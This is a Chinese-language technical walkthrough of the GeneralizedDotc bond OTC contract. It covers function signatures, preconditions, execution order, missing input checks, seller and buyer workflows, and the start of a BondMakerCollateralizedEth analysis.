- 全局 BondMaker 预言机和**全局**波动率预言机均不能 revert（此处用的**不是** Pool 里那个 `volatilityOracle`）。
- Pool 中 `bondPricer`（卖方定价器）的 `calcPriceAndLeverage()` 不能 revert。
- 与另两个 calcRate 不同：不需要交易对预言机。`swapPairPriceE8` 被赋值为常量 `10**8` 仅作返回值，**不参与运算**——`rateE8` 直接 = `bondPriceE8 × (10⁸ + spread) / 10⁸`（不会除以 `1+spread`，因为 BondVsBond 的 isBondSale 硬编码为 true）。



##### createVsBondPool —— 创建 Bond vs Bond 交易池

```
function createVsBondPool(
    address bondMakerForUserAddress,
    address volatilityOracleAddress,
    address bondPricerForUserAddress,
    address bondPricerAddress,
    int16 feeBaseE4
) external returns (bytes32 poolID);
```

函数作用：创建一个 Bond vs Bond 交易池。卖家卖自己的债券，买家从另一个 BondMaker 用债券篮子支付。Pool ID 由 `keccak256(abi.encode("Bond vs SBT exchange", address(this), seller, bondMakerForUser))` 生成。

参数含义：
- `bondMakerForUserAddress`：买家端的 BondMaker 地址（买家拥有的债券由此 BondMaker 发行）。**由卖家任意指定**。
- `volatilityOracleAddress`：买家端波动率预言机地址（仅给买方债券篮子估价用）。
- `bondPricerForUserAddress`：买家端债券定价器地址（为买家的债券篮子估价）。
- `bondPricerAddress`：卖家端债券定价器地址（为卖家的债券估价）。
- `feeBaseE4`：基础费率，单位基点。如 `50` = 0.5%。**类型 `int16`，允许负值，无范围校验**。

返回值：
- `poolID`：新创建池的唯一标识符。

条件限制：
- 该 Pool ID 不能已存在（`seller == address(0)` 才可创建）。
- `bondMakerForUserAddress` 不能为 `address(0)`。
- `bondPricerForUserAddress` 和 `bondPricerAddress` 不能为 `address(0)`。
- `bondMakerForUserAddress` 的 `decimalsOfOraclePrice()` 必须等于 8。
- `bondMakerForUserAddress` 的 `decimalsOfBond()` 必须等于 8。

> **没有的校验**：`volatilityOracleAddress` 无非零检查（可传 `address(0)`）；两个 BondPricer 只查地址非零，**不会试调用**；`bondMakerForUser` 除了两个 decimals 之外不做任何身份验证。
> `_assertBondMakerDecimals` 在 `_createVsBondPool` 和 `_setVsBondPool` 中各调用了一次（重复但无害）。



##### createVsErc20Pool —— 创建 Bond vs ERC20 交易池

```
function createVsErc20Pool(
    address swapPairAddress,
    address swapPairOracleAddress,
    address bondPricerAddress,
    int16 feeBaseE4,
    bool isBondSale
) external returns (bytes32 poolID);
```

函数作用：创建一个 Bond vs ERC20 交易池。Pool ID 由 `keccak256(abi.encode("Bond vs ERC20 exchange", address(this), seller, swapPairAddress, isBondSale))` 生成。

参数含义：
- `swapPairAddress`：交易对 ERC20 代币地址。
- `swapPairOracleAddress`：该 ERC20 的 USD 价格预言机地址。
- `bondPricerAddress`：债券定价器地址。
- `feeBaseE4`：基础费率，单位基点。
- `isBondSale`：交易方向。`true` = 卖家卖债券收 ERC20；`false` = 卖家收债券付 ERC20。

返回值：
- `poolID`：新创建池的唯一标识符。

条件限制：
- 该 Pool ID 不能已存在。
- `swapPairAddress`、`swapPairOracleAddress`、`bondPricerAddress` 均不能为 `address(0)`。
- 创建时会立即调用 `swapPairOracleAddress.latestPrice()` 验证预言机可用，返回值不能为 0。



##### createVsEthPool —— 创建 Bond vs ETH 交易池

```
function createVsEthPool(
    address ethOracleAddress,
    address bondPricerAddress,
    int16 feeBaseE4,
    bool isBondSale
) external returns (bytes32 poolID);
```

函数作用：创建一个 Bond vs ETH 交易池。Pool ID 由 `keccak256(abi.encode("Bond vs ETH exchange", address(this), seller, isBondSale))` 生成。

参数含义：
- `ethOracleAddress`：ETH 的 USD 价格预言机地址。
- `bondPricerAddress`：债券定价器地址。
- `feeBaseE4`：基础费率，单位基点。
- `isBondSale`：交易方向。`true` = 卖家卖债券收 ETH；`false` = 卖家收债券付 ETH。

返回值：
- `poolID`：新创建池的唯一标识符。

条件限制：
- 该 Pool ID 不能已存在。
- `ethOracleAddress` 和 `bondPricerAddress` 不能为 `address(0)`。
- 创建时会立即调用 `ethOracleAddress.latestPrice()` 验证预言机可用，返回值不能为 0。



##### deleteVsBondPool —— 删除 Bond vs Bond 池

```
function deleteVsBondPool(bytes32 poolID) external;
```

函数作用：删除指定 Bond vs Bond 交易池，清空所有 Pool 数据。

参数含义：
- `poolID`：要删除的池 ID。

条件限制：
- `msg.sender` 必须等于 `pool.seller`（只有池的创建者可以删除）。
- Pool 必须存在。



##### deleteVsErc20Pool —— 删除 Bond vs ERC20 池

```
function deleteVsErc20Pool(bytes32 poolID) external;
```

函数作用：删除指定 Bond vs ERC20 交易池。

参数含义：
- `poolID`：要删除的池 ID。

条件限制：
- `msg.sender` 必须等于 `pool.seller`。
- Pool 必须存在。



##### deleteVsEthPool —— 删除 Bond vs ETH 池

```
function deleteVsEthPool(bytes32 poolID) external;
```

函数作用：删除指定 Bond vs ETH 交易池。

参数含义：
- `poolID`：要删除的池 ID。

条件限制：
- `msg.sender` 必须等于 `pool.seller`。
- Pool 必须存在。



##### depositEth —— 存入 ETH

```
function depositEth() external payable;
```

函数作用：将 ETH 存入合约，增加调用者的 `_depositedEth` 余额。这是参与 Bond vs ETH 交易的前提——在 ETH 池中交易时，合约从 `_depositedEth` 记账余额中扣款，而不是从 `msg.value` 实时转账。

参数含义：无显式参数。通过 `msg.value` 传入 ETH 数量。

条件限制：
- 无显式 require，但 `_addEthAllowance` 内含溢出保护（`_depositedEth[sender] >= amount` 检查）。



##### exchangeBondToBond —— 用债券篮子买债券

```
function exchangeBondToBond(
    bytes32 bondID,
    bytes32 poolID,
    bytes32[] calldata bondIDs,
    uint256 amountInDollarsE8,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 bondAmount);
```

函数作用：买家用自己的多只债券（来自另一个 BondMaker）作为支付，购买卖家的一只债券。这是 Bond vs Bond 池唯一的交易方向（`isBondSale` 硬编码为 `true`）。

参数含义：
- `bondID`：要购买的债券 ID（卖家端）。
- `poolID`：目标 VsBond 池 ID。
- `bondIDs`：买家用来支付的债券 ID 数组（来自买家的 BondMaker）。
- `amountInDollarsE8`：买家愿意支付的总额（USD 计价，精度 8 位小数）。
- `expectedAmount`：买家预期至少收到的债券数量（精度 8）。
- `range`：滑点容忍度（精度 3）。如 `50` = 允许 5% 偏差。

返回值：
- `bondAmount`：买家实际收到的债券数量（精度 8 位小数）。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `true`（VsBondPool 恒为 true）。
- `bondIDs` 不能为空数组。
- 目标债券必须在卖家 BondMaker 中已注册（此处**有**显式的 `require(address(bondToken) != address(0), "the bond is not registered")`）。
- 汇率必须严格落在开区间 `(MIN_EXCHANGE_RATE_E8, MAX_EXCHANGE_RATE_E8)` = `(100, 10^14)` 内（`>` 和 `<`，端点不含）。
- 计算的 `bondAmount` 不能为 0。
- 卖家的债券 token 必须已授权给本合约足够的额度，且 `transferFrom(seller → buyer)` 必须成功。
- `_batchTransferBondFrom` 必须成功凑够 `amountInDollars`，否则遍历结束后无条件 `revert("insufficient bond allowance")`。
- 滑点保护：`bondAmount × (1000 + range) / 1000 >= expectedAmount`（当 `expectedAmount != 0` 时）。

**执行顺序**：先 `bondToken.transferFrom(seller → buyer)`（卖家的债券先出去），**再**调用 `_batchTransferBondFrom` 收买家的债券篮子。

**`_batchTransferBondFrom` 的实际语义**（这是本函数最复杂的部分）：

1. 取价基准来自 `bondMakerForUser.oracleAddress().latestPrice()` —— **卖家指定的 BondMaker 的预言机**。
2. 顺序遍历 `bondIDs`，对每一只：
   - `maturity > maturityBorder` → **跳过**（`maturityBorder` 就是卖家那只债券的 `maturity`）；
   - 若该债券已过期，`maturity - block.timestamp` 下溢 → **revert**（不是跳过）；
   - `allowance == 0` → **跳过**；
   - `_calcBondPrice` 返回 0 → **跳过**。注意 `_calcBondPrice` 用 `try/catch` 包住 `calcPriceAndLeverage`，pricer revert 时返回 0；但形状识别失败时是直接 `revert("unknown bond type")`。
3. 若 `rest <= allowance × bondPrice`，转走 `ceil(rest / bondPrice)` 并**直接 return**，剩余的 bondIDs 不再处理；否则转走全部 `allowance`，`rest -= allowance × bondPrice`，继续下一只。
4. 遍历完仍未凑够 → `revert("insufficient bond allowance")`。

> `bondAmount` 的计算用的是 `bondToken.decimals() + 8` 而非常量 16，读的是卖方债券 token 自报的精度。



##### exchangeBondToErc20 —— 用债券换 ERC20

```
function exchangeBondToErc20(
    bytes32 bondID,
    bytes32 poolID,
    uint256 bondAmount,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 swapPairAmount);
```

函数作用：买家支付债券，从卖家处获得 ERC20 代币。要求池的 `isBondSale = false`。

参数含义：
- `bondID`：买家用来支付的债券 ID。
- `poolID`：目标 VsErc20 池 ID。
- `bondAmount`：买家愿意支付的债券数量（精度 8）。
- `expectedAmount`：买家预期至少收到的 ERC20 数量（精度取决于该 ERC20 代币）。
- `range`：滑点容忍度（精度 3）。

返回值：
- `swapPairAmount`：买家实际收到的 ERC20 代币数量。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `false`。
- 债券必须已注册（显式 `require(address(bondToken) != address(0))`）。
- 汇率必须严格落在开区间 `(10^2, 10^14)` 内。
- 计算的 `swapPairAmount` 不能为 0。
- 买家必须事先 `approve` 债券 token 给本合约，`transferFrom(buyer → seller)` 必须成功。
- 卖家必须事先 `approve` ERC20 给本合约，`safeTransferFrom(seller → buyer)` 必须成功。
- 滑点保护同 `exchangeBondToBond`。

**执行顺序**：先 `bondToken.transferFrom(buyer → seller)`，再 `swapPairToken.safeTransferFrom(seller → buyer)`。债券腿用裸 `transferFrom` + `require(bool)`，ERC20 腿用 `SafeERC20`。



##### exchangeBondToEth —— 用债券换 ETH

```
function exchangeBondToEth(
    bytes32 bondID,
    bytes32 poolID,
    uint256 bondAmount,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 ethAmount);
```

函数作用：买家支付债券，从卖家处获得 ETH（从卖家的 `_depositedEth` 余额中划转）。要求池的 `isBondSale = false`。

参数含义：
- `bondID`：买家用来支付的债券 ID。
- `poolID`：目标 VsEth 池 ID。
- `bondAmount`：买家愿意支付的债券数量（精度 8）。
- `expectedAmount`：买家预期至少收到的 ETH 数量（精度 18）。
- `range`：滑点容忍度（精度 3）。

返回值：
- `ethAmount`：买家实际收到的 ETH 数量（精度 18）。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `false`。
- 债券必须已注册。
- 汇率必须在有效范围内。
- 计算的 `ethAmount` 不能为 0。
- 买家必须事先 `approve` 债券 token 给本合约，`transferFrom(buyer → seller)` 必须成功。
- 卖家必须有足够的 `_depositedEth` 余额（`_subEthAllowance` 检查，报 `"insufficient allowance"`）。
- 合约 ETH 余额必须足够支付（`_transferETH` 内的 `_hasSufficientBalance`）。
- 滑点保护同上。

**执行顺序**：先 `bondToken.transferFrom(buyer → seller)`，再 `_transferEthFrom(seller → buyer)`。后者用 `call{value:}` 把原生 ETH 直接打给买家。本合约共有三处会这样把控制权交给外部地址：`exchangeBondToEth`（打给买家）、`exchangeEthToBond`（打给卖家）、`withdrawEth`（打给自己）。



##### exchangeErc20ToBond —— 用 ERC20 买债券

```
function exchangeErc20ToBond(
    bytes32 bondID,
    bytes32 poolID,
    uint256 swapPairAmount,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 bondAmount);
```

函数作用：买家支付 ERC20 代币，从卖家处获得债券。要求池的 `isBondSale = true`。

参数含义：
- `bondID`：要购买的债券 ID。
- `poolID`：目标 VsErc20 池 ID。
- `swapPairAmount`：买家愿意支付的 ERC20 代币数量。
- `expectedAmount`：买家预期至少收到的债券数量（精度 8）。
- `range`：滑点容忍度（精度 3）。

返回值：
- `bondAmount`：买家实际收到的债券数量（精度 8 位小数）。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `true`。
- 债券必须已注册。
- 汇率必须在有效范围内。
- 计算的 `bondAmount` 不能为 0。
- 卖家必须事先 `approve` 债券 token 给本合约，`transferFrom(seller → buyer)` 必须成功。
- 买家必须事先 `approve` ERC20 给本合约，`safeTransferFrom(buyer → seller)` 必须成功。
- 滑点保护同上。

**执行顺序**：先 `bondToken.transferFrom(seller → buyer)`（卖家的债券先出去），再 `swapPairToken.safeTransferFrom(buyer → seller)` 收款。

> `bondAmount = _applyDecimalGap(swapPairAmount, swapPairToken.decimals(), 16) / rateE8`——`decimals()` 取自**卖家指定的任意 ERC20 合约**，若其 `decimals()` 与 16 的差超过 18 会 revert。



##### exchangeEthToBond —— 用 ETH 买债券

```
function exchangeEthToBond(
    bytes32 bondID,
    bytes32 poolID,
    uint256 ethAmount,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 bondAmount);
```

函数作用：买家支付 ETH（从自己的 `_depositedEth` 余额中扣除），从卖家处获得债券。要求池的 `isBondSale = true`。

参数含义：
- `bondID`：要购买的债券 ID。
- `poolID`：目标 VsEth 池 ID。
- `ethAmount`：买家愿意支付的 ETH 数量（精度 18）。
- `expectedAmount`：买家预期至少收到的债券数量（精度 8）。
- `range`：滑点容忍度（精度 3）。

返回值：
- `bondAmount`：买家实际收到的债券数量（精度 8 位小数）。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `true`。
- 债券必须已注册。
- 汇率必须在有效范围内。
- 计算的 `bondAmount` 不能为 0。
- 卖家必须事先 `approve` 债券 token 给本合约。
- 买家必须事先 `depositEth()`，有足够的 `_depositedEth` 余额。
- 滑点保护同上。

**执行顺序**：先 `bondToken.transferFrom(seller → buyer)`，再 `_transferEthFrom(buyer → seller)` —— 后者会**把原生 ETH 立即打给卖家**，而不是在 `_depositedEth` 里做记账划转。也就是说卖家收到的 ETH 直接进钱包，不需要 `withdrawEth`。



##### totalBondAllowance —— 计算债券篮子的 USD 估值

```
function totalBondAllowance(
    bytes32 poolID,
    bytes32[] calldata bondIDs,
    uint256 maturityBorder,
    address owner
) external returns (uint256 allowanceInDollarsE8);
```

函数作用：计算某用户在指定 BondVsBond 池中，已授权给本合约的所有债券的 USD 总价值。遍历 `bondIDs`，跳过到期日超过 `maturityBorder` 的债券，对每只债券计算 `allowance × bondPrice` 并累加。此函数为 `nonpayable`（内部调用预言机），通常在交易前用来检查买家是否有足够的额度。

参数含义：
- `poolID`：目标 VsBond 池 ID。
- `bondIDs`：要评估的债券 ID 数组。
- `maturityBorder`：到期日上限。到期日超过此值的债券将被跳过。
- `owner`：要查询的债券持有者地址。

返回值：
- `allowanceInDollarsE8`：所有已授权债券的 USD 总估值（精度 8）。

条件限制：
- Pool 必须存在（仅 BondVsBond 池有效，因为只有 BondVsBond 池才存储 `bondMakerForUser` 等信息）。
- `bondIDs` 中包含的每只债券：`owner` 的 `balanceOf` 不能为 0（revert: `"includes no bond balance"`）。
- 每只债券：`owner` 对本合约的 `allowance` 不能为 0（revert: `"includes no approved bond"`）。
- 每只债券：BondPricer 计算的价格不能为 0（revert: `"includes worthless bond"`）。
- 到期日超过 `maturityBorder` 的债券会被静默跳过（不会 revert）。
- 预言机 `latestPrice()` 和 `getVolatility()` 不能 revert。

> **与 `_batchTransferBondFrom` 的三处行为差异**（同样是遍历 bondIDs，但语义并不一致）：
>
> | 情况             | `totalBondAllowance` | `_batchTransferBondFrom` |
> | ---------------- | -------------------- | ------------------------ |
> | `balanceOf == 0` | revert               | 不检查                   |
> | `allowance == 0` | revert               | 跳过                     |
> | `bondPrice == 0` | revert               | 跳过                     |
>
> 因此 `totalBondAllowance` 返回的数字是"**这批 bondIDs 全部有效时**的总估值"，而实际成交时 `_batchTransferBondFrom` 会容忍并跳过无效项。两者不能直接互相印证。函数注释里写的 "Unnecessary bond must not be included in bondIDs"（`totalBondAllowance`）与 "Unnecessary bonds can be included in bondIDs"（`_batchTransferBondFrom`）正是在讲这个差别。



##### updateVsBondPool —— 更新 Bond vs Bond 池参数

```
function updateVsBondPool(
    bytes32 poolID,
    address volatilityOracleAddress,
    address bondPricerForUserAddress,
    address bondPricerAddress,
    int16 feeBaseE4
) external;
```

函数作用：更新 Bond vs Bond 池的可变参数。不可改 `bondMakerForUser`（池的买方 BondMaker 在创建时固定）。不可改交易方向（始终为卖债券）。

参数含义：
- `poolID`：目标池 ID。
- `volatilityOracleAddress`：新的波动率预言机地址。
- `bondPricerForUserAddress`：新的买家端定价器地址。
- `bondPricerAddress`：新的卖家端定价器地址。
- `feeBaseE4`：新的费率。

条件限制：
- `msg.sender` 必须等于 `pool.seller`。
- Pool 必须存在。
- `bondPricerForUserAddress` 和 `bondPricerAddress` 不能为 `address(0)`。
- 原 `bondMakerForUser` 的精度约束（`decimalsOfBond` 和 `decimalsOfOraclePrice` 均为 8）会被重新验证。



##### updateVsErc20Pool —— 更新 Bond vs ERC20 池参数

```
function updateVsErc20Pool(
    bytes32 poolID,
    address swapPairOracleAddress,
    address bondPricerAddress,
    int16 feeBaseE4
) external;
```

函数作用：更新 Bond vs ERC20 池的可变参数。不可改交易对代币（`swapPairToken`）和方向（`isBondSale`）。

参数含义：
- `poolID`：目标池 ID。
- `swapPairOracleAddress`：新的 ERC20 价格预言机地址。
- `bondPricerAddress`：新的定价器地址。
- `feeBaseE4`：新的费率。

条件限制：
- `msg.sender` 必须等于 `pool.seller`。
- Pool 必须存在。
- `swapPairOracleAddress` 和 `bondPricerAddress` 不能为 `address(0)`。



##### updateVsEthPool —— 更新 Bond vs ETH 池参数

```
function updateVsEthPool(
    bytes32 poolID,
    address ethOracleAddress,
    address bondPricerAddress,
    int16 feeBaseE4
) external;
```

函数作用：更新 Bond vs ETH 池的可变参数。不可改方向（`isBondSale`）。

参数含义：
- `poolID`：目标池 ID。
- `ethOracleAddress`：新的 ETH 价格预言机地址。
- `bondPricerAddress`：新的定价器地址。
- `feeBaseE4`：新的费率。

条件限制：
- `msg.sender` 必须等于 `pool.seller`。
- Pool 必须存在。
- `ethOracleAddress` 和 `bondPricerAddress` 不能为 `address(0)`。



##### withdrawEth —— 提取已存入的 ETH

```
function withdrawEth() external returns (uint256 amount);
```

函数作用：提取调用者所有已存入的 ETH（`_depositedEth[msg.sender]` 的全部余额）。

返回值：
- `amount`：提取的 ETH 数量（精度 18）。

条件限制：
- 调用者必须有 `_depositedEth` 余额（否则 amount 为 0，但不会 revert）。
- 合约的 ETH 余额必须足够支付（`_transferEthFrom` 内部检查）。



##### receive —— 接收 ETH

```
receive() external payable;
```

函数作用：接收直接发往合约地址的 ETH。仅发出 `LogTransferETH` 事件。

**重要警告**：`receive()` 不会增加 `_depositedEth` 余额！直接向合约地址转账的 ETH 将永久锁定在合约中，没有任何方式取出。要存入可供交易的 ETH，必须使用 `depositEth()`。



#### 只读函数

> 下面的签名为便于阅读把接口类型写成了 `address`。源码中它们的返回类型是具体接口（`BondMakerInterface` / `LatestPriceOracleInterface` / `BondPricerInterface` / `ERC20` 等），ABI 编码上与 `address` 完全一致。

##### bondMakerAddress —— 获取关联的 BondMaker 地址

```
function bondMakerAddress() external view returns (address);
```

返回构造函数中设定的 BondMaker 地址（不可变）。



##### volumeCalculatorAddress —— 获取 USD 换算器地址

```
function volumeCalculatorAddress() external view returns (address);
```

返回构造函数中设定的 volume calculator（USD 汇率换算器）地址（不可变）。



##### ethAllowance —— 查询已存 ETH 余额

```
function ethAllowance(address owner) external view returns (uint256 amount);
```

返回指定地址在本合约中的 `_depositedEth` 余额（通过 `depositEth()` 存入的 ETH）。



##### generateVsBondPoolID —— 计算 Bond vs Bond 池 ID

```
function generateVsBondPoolID(
    address seller,
    address bondMakerForUser
) external view returns (bytes32 poolID);
```

根据 seller 和 bondMakerForUser 确定性计算 Pool ID，与 `createVsBondPool` 生成的 ID 一致。公式：`keccak256(abi.encode("Bond vs SBT exchange", address(this), seller, bondMakerForUser))`。



##### generateVsErc20PoolID —— 计算 Bond vs ERC20 池 ID

```
function generateVsErc20PoolID(
    address seller,
    address swapPairAddress,
    bool isBondSale
) external view returns (bytes32 poolID);
```

根据 seller、swapPair 和方向确定性计算 Pool ID。公式：`keccak256(abi.encode("Bond vs ERC20 exchange", address(this), seller, swapPairAddress, isBondSale))`。



##### generateVsEthPoolID —— 计算 Bond vs ETH 池 ID

```
function generateVsEthPoolID(
    address seller,
    bool isBondSale
) external view returns (bytes32 poolID);
```

根据 seller 和方向确定性计算 Pool ID。公式：`keccak256(abi.encode("Bond vs ETH exchange", address(this), seller, isBondSale))`。



##### getVsBondPool —— 查询 Bond vs Bond 池详情

```
function getVsBondPool(bytes32 poolID)
    external
    view
    returns (
        address seller,
        address bondMakerForUserAddress,
        address volatilityOracle,
        address bondPricerForUserAddress,
        address bondPricerAddress,
        int16 feeBaseE4,
        bool isBondSale
    );
```

返回 Bond vs Bond 池的全部字段。注意：返回的 `isBondSale` 为硬编码的 `true`，不是存储值（Pool 结构体中没有此字段）。

条件限制：Pool 必须存在，否则 revert。



##### getVsErc20Pool —— 查询 Bond vs ERC20 池详情

```
function getVsErc20Pool(bytes32 poolID)
    external
    view
    returns (
        address seller,
        address swapPairToken,
        address swapPairOracle,
        address bondPricer,
        int16 feeBaseE4,
        bool isBondSale
    );
```

返回 Bond vs ERC20 池的全部字段。

条件限制：Pool 必须存在，否则 revert。

##### getVsEthPool —— 查询 Bond vs ETH 池详情

```
function getVsEthPool(bytes32 poolID)
    external
    view
    returns (
        address seller,
        address ethOracleAddress,
        address bondPricerAddress,
        int16 feeBaseE4,
        bool isBondSale
    );
```

返回 Bond vs ETH 池的全部字段。

条件限制：Pool 必须存在，否则 revert。



### 使用手册



#### 卖家

以下工作流的前提是：你已通过一级市场流程持有了 bond token。

> **注意**：这只是业务上的前提，不是合约的要求。`createVs*Pool` **不检查调用者持有任何债券或代币**——任何地址都能凭空创建 Pool。持仓和 approve 只在真正成交时才会被 `transferFrom` 校验。

##### 工作流一：创建 Pool — 卖债券换 ERC20

1. 确认你持有要卖的 Bond Token，并知道它的 `bondID`。
2. 确认交易对 ERC20 代币地址、该 ERC20 的 USD 预言机地址、债券定价器地址。
3. 决定费率：`feeBaseE4`，如 `50` = 0.5%。
4. 调用 `createVsErc20Pool(swapPair, swapPairOracle, bondPricer, feeBaseE4, true)`。
5. 记录返回的 `poolID`。
6. 调用 `bondToken.approve(GeneralizedDotc地址, 数量)`，授权合约从你账户转走债券。

之后买家调用 `exchangeErc20ToBond` 时，交易自动执行：买家付 ERC20 → 你收到 ERC20，你付债券 → 买家收到债券。

##### 工作流二：创建 Pool — 收债券付 ERC20

1. 确认你持有要支付的 ERC20 代币。
2. 调用 `createVsErc20Pool(swapPair, swapPairOracle, bondPricer, feeBaseE4, false)`。
3. 调用 `swapPairToken.approve(GeneralizedDotc地址, 数量)`，授权合约从你账户转走 ERC20。

之后买家调用 `exchangeBondToErc20` 时，买家付债券 → 你收到债券，你付 ERC20 → 买家收到 ERC20。

##### 工作流三：创建 Pool — 卖债券换 ETH

1. 调用 `createVsEthPool(ethOracle, bondPricer, feeBaseE4, true)`。
2. 调用 `bondToken.approve(GeneralizedDotc地址, 数量)`。
3. **不需要** `depositEth()`——作为卖家卖债券，你收 ETH，不需要存 ETH。

##### 工作流四：创建 Pool — 收债券付 ETH

1. 调用 `createVsEthPool(ethOracle, bondPricer, feeBaseE4, false)`。
2. 调用 `depositEth()` 并附带足够 ETH（`msg.value`）。
3. 可随时调用 `depositEth()` 追加资金，或调用 `withdrawEth()` 全部提走。
4. 调用 `bondToken.approve` **不需要**——你收债券，不付债券。

> 务必使用 `depositEth()`，不要直接向合约地址转账 ETH（会永久锁死）。

##### 工作流五：创建 Pool — Bond vs Bond（卖自己的债券收买家的债券篮子）

1. 确认买家的 BondMaker 地址（`bondMakerForUser`）、波动率预言机地址、买家端定价器地址。
2. 调用 `createVsBondPool(bondMakerForUser, volOracle, bondPricerForUser, bondPricer, feeBaseE4)`。
3. 调用 `bondToken.approve(GeneralizedDotc地址, 数量)`——授权你要卖的债券。
4. **不需要**授权买家的债券——那是买家的事。

> BondVsBond 池固定方向为卖家卖债券。不存在"卖家收债券"的方向。

##### 工作流六：管理 Pool

更新池参数——只改预言机、定价器或费率，不可改方向和交易对：
- ERC20 池：`updateVsErc20Pool(poolID, newOracle, newPricer, newFee)`
- ETH 池：`updateVsEthPool(poolID, newOracle, newPricer, newFee)`
- Bond 池：`updateVsBondPool(poolID, newVolOracle, newPricerForUser, newPricer, newFee)`

删除池：
- `deleteVsErc20Pool(poolID)` / `deleteVsEthPool(poolID)` / `deleteVsBondPool(poolID)`



#### 买家

##### 工作流一：找到目标 Pool

1. 从卖家处获取：`seller` 地址、交易对代币地址（或 BondMaker 地址）、方向（`isBondSale`）。
2. 调用对应 `generateVs*PoolID` 计算 Pool ID：
   - ERC20 池：`generateVsErc20PoolID(seller, swapPair, isBondSale)`
   - ETH 池：`generateVsEthPoolID(seller, isBondSale)`
   - Bond 池：`generateVsBondPoolID(seller, bondMakerForUser)`
3. （可选）调用 `getVs*Pool(poolID)` 验证池信息。

##### 工作流二：用 ERC20 买债券

1. 确认池方向为 `isBondSale = true`。
2. 调用 `calcRateBondToErc20(bondID, poolID)` 获取当前汇率（注意：此函数消耗 gas）。
3. 根据汇率计算你要付多少 ERC20。
4. 调用 `erc20Token.approve(GeneralizedDotc地址, swapPairAmount)` 授权。
5. 调用 `exchangeErc20ToBond(bondID, poolID, swapPairAmount, expectedAmount, range)`。
   - `expectedAmount`：你预期至少收到多少债券（设 0 则跳过滑点保护）。
   - `range`：滑点容忍度，如 `50` = 5%。没把握时设大一些，如 `100`。

##### 工作流三：用债券换 ERC20

1. 确认池方向为 `isBondSale = false`。
2. 调用 `calcRateBondToErc20(bondID, poolID)` 查汇率。
3. 调用 `bondToken.approve(GeneralizedDotc地址, bondAmount)` 授权你要付的债券。
4. 调用 `exchangeBondToErc20(bondID, poolID, bondAmount, expectedAmount, range)`。

##### 工作流四：用 ETH 买债券

1. 确认池方向为 `isBondSale = true`。
2. 调用 `depositEth()` 存入 ETH（`msg.value`）。
3. 调用 `calcRateBondToEth(bondID, poolID)` 查汇率。
4. 调用 `exchangeEthToBond(bondID, poolID, ethAmount, expectedAmount, range)`——从你的 `_depositedEth` 中扣款。
5. 如果买完后 `_depositedEth` 还有剩余，可调用 `withdrawEth()` 提出。

##### 工作流五：用债券换 ETH

1. 确认池方向为 `isBondSale = false`，且卖家已 `depositEth` 足额。
2. 调用 `bondToken.approve(GeneralizedDotc地址, bondAmount)`。
3. 调用 `exchangeBondToEth(bondID, poolID, bondAmount, expectedAmount, range)`。
4. 收到的 ETH 会直接转入你的钱包（`_transferETH` 发送原生 ETH），不在 `_depositedEth` 中——不用再提现。

##### 工作流六：用债券篮子买债券（Bond vs Bond）

1. 确认池信息（方向固定为 `true`）。
2. 准备好你要用来支付的债券 ID 数组（`bondIDs`）。
3. 调用 `totalBondAllowance(poolID, bondIDs, maturityBorder, 你的地址)` 计算你已授权的债券篮子总 USD 估值，确认足够支付。
4. 对 `bondIDs` 中的每一只债券，调用 `bondToken.approve(GeneralizedDotc地址, 数量)`。
5. 调用 `calcRateBondToUsd(bondID, poolID)` 查汇率。
6. 调用 `exchangeBondToBond(bondID, poolID, bondIDs, amountInDollarsE8, expectedAmount, range)`。

内部流程：合约先把卖家的债券转给你，**再**按 `bondIDs` 顺序逐只从你账户转债券给卖家，直到累计 USD 价值达到 `amountInDollars`。到期日超过卖家债券到期日的会被跳过，allowance 为 0 的会被跳过，定价器报价为 0 的也会被跳过；遍历完仍不够则整笔 revert（`"insufficient bond allowance"`）。

> `totalBondAllowance` 的返回值**不能直接当作"这批 bondIDs 一定够付"的凭证**：它对 allowance 为 0、报价为 0 的债券是 revert，而实际成交时这些会被静默跳过。两个函数遍历同一个数组会得到不同结果。



#### 只读用户

这一组函数任何人都可以调用。前 5 项是真 `view`，`eth_call` 不花 gas：

- 查 BondMaker 地址：`bondMakerAddress()`
- 查 Volume Calculator 地址：`volumeCalculatorAddress()`
- 查某人已存 ETH 余额：`ethAllowance(address)`
- 算 Pool ID：三个 `generateVs*PoolID`
- 查 Pool 详情：三个 `getVs*Pool`（Pool 不存在会 revert）

而 `totalBondAllowance` 和三个 `calcRate*` **不是 `view`**（它们要以非 view 方式调用外部预言机），发交易调用会消耗 gas；若只是查询，仍可用 `eth_call` 模拟。



> 注意, 到目前为止, 这里明显有一个缺口: 谁创建了Bond, 要用他进行买卖, 那么就必须有一个一级市场来创建Bond

## BondMaker 分析

```solidity
    function bondMakerAddress() external view returns (BondMakerInterface) {
        return _bondMakerContract;
    }
```

通过该函数得到GeneralizedDotc实际使用的bondMaker是0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0 (BondMakerCollateralizedEth)

Is Proxy : No

Source Verification : Verified on Etherscan

### 基本概念

BondMaker 是一级市场——负责债券的铸造、清算和抵押品管理。GeneralizedDotc 是二级市场——负责已发行债券的 OTC 交易。

#### BondMakerCollateralizedEth

`BondMakerCollateralizedEth` 继承自 `BondMaker`（抽象合约），抵押品固定为 **ETH**。

> **一句话理解**：BondMaker = 债券的"印钞厂 + 保险库"。你用 ETH 做抵押，铸造债券代币；到期后预言机报价，按 payoff 规则用抵押的 ETH 兑付。全程 ETH 进出，不涉及 ERC20 抵押品。

##### 核心状态变量

| 变量                       | 类型                               | 含义                                                |
| -------------------------- | ---------------------------------- | --------------------------------------------------- |
| `_bonds`                   | `mapping(bytes32 → BondInfo)`      | bondID → 债券信息（到期日、token、行权价、fnMapID） |
| `_registeredFnMap`         | `mapping(bytes32 → LineSegment[])` | fnMapID → payoff 折线                               |
| `_bondGroupList`           | `mapping(uint256 → BondGroup)`     | bondGroupID → 债券组（bondID 数组 + 到期日）        |
| `_nextBondGroupID`         | `uint256`                          | 下一个可用的 bondGroupID（从 1 开始自增）           |
| `_oracleContract`          | `PriceOracleInterface`             | 价格预言机（immutable）                             |
